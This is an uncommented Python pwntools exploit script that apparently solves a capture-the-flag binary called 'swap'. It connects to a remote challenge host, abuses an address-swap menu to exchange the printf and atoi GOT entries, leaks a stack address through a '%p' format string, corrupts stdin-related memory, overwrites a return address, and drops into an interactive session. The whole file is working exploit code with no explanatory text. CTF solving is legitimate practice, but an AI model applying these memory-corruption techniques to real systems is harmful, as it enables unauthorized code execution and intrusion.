#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.13"
port = 4869
host = "swap.chal.ctf.westerns.tokyo"
port = 37567
r = remote(host,port)


def setaddr(a,b):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(a))
    r.recvuntil(":")
    r.sendline(str(b))

def swap():
    r.recvuntil(":")
    r.sendline("2")

def setaddr_a(a,b):
    r.recvuntil(":")
    r.sendline("")
    r.recvuntil(":")
    r.sendline(str(a))
    r.recvuntil(":")
    r.sendline(str(b))

def swap_a():
    r.recvuntil(":")
    r.sendline("2")




put_got = 0x601028
printf_got = 0x601038
atoi_got = 0x601050

setaddr(printf_got,atoi_got)
swap()
r.send("%p")
r.recvuntil("choice:")
r.recvuntil("\n")
stack = int(r.recvuntil("In")[:-2],16)
print hex(stack)
v4 = stack + 0x2a
v5 = v4+8
#libc_start_main_addr = stack+0x52
stdin = stack - 0x80e
print hex(stdin)
stderr = 0x6010a0

buf = 0x6011d0
setaddr_a(stdin,buf)
swap_a()
pstdin = buf-7
pstderr = stderr - 7
e0 = stack-0x5ed
f8 = stack - 0x27ee - 7
zero = buf + 0x100
sixty = stack - 0x18c-7
setaddr_a(pstdin,f8)
swap_a()
setaddr_a(v4,buf)
swap_a()
setaddr_a("-",stack-0x18e)
swap_a()
r.recvuntil(":")
r.sendline("")
r.recvuntil(":")
r.send("a"*8 + p16(0x4651))
r.interactive()
